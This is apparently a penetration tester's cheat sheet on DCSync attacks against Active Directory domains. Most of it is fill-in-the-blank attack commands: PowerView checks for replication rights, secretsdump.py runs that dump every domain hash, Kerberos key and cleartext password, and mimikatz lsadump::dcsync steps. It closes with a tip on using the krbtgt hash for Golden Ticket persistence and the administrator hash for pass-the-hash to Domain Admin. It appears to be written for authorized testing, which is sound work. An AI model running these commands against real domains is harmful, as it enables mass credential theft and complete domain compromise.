# DCSync

Requires: `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` on the domain object. DA/EA have this by default; non-admin accounts can be granted it (common Exchange artifact, or direct ACL misconfiguration).

Verify a specific user's DCSync rights before running:

```powershell
$sid = "<USER_SID>"
Get-ObjectAcl "DC=<DOMAIN>,DC=<TLD>" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier,ObjectDN,ActiveDirectoryRights,ObjectAceType
```

---

## From Linux — secretsdump.py

Dump all hashes + Kerberos keys + any cleartext (reversible encryption accounts):

```bash
secretsdump.py -outputfile <OUTFILE> -just-dc <DOMAIN>/<USER>@<DC_IP>
```

NTLM only:

```bash
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DC_IP>
```

Single user:

```bash
secretsdump.py -just-dc-user <TARGET_USER> <DOMAIN>/<USER>@<DC_IP>
```

Useful extra flags: `-pwd-last-set` / `-history` / `-user-status` (filter disabled accounts before reporting crack stats to client).

Output files: `<OUTFILE>.ntds` / `<OUTFILE>.ntds.kerberos` / `<OUTFILE>.ntds.cleartext`

---

## From Windows — Mimikatz

Must run in the context of the user with DCSync rights — use runas if needed:

```cmd
runas /netonly /user:<DOMAIN>\<USER> powershell
```

Then in the spawned session:

```
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:<DOMAIN>\<TARGET_USER>
```

Pull `administrator` or `krbtgt` hash specifically — `krbtgt` → Golden Ticket (persistence, out of this module's scope).

---

## Reversible Encryption Accounts

If secretsdump returns a `.ntds.cleartext` file — those are plaintext passwords from accounts with reversible encryption enabled. Rare but high value.

Find them before dumping:

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname,useraccountcontrol
```

Or with AD module:

```powershell
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```

> [!tip] DCSync on the `krbtgt` hash is the setup for Golden Ticket persistence. On the `administrator` hash it's PTH straight to DA. Either way, validate with CME immediately after obtaining.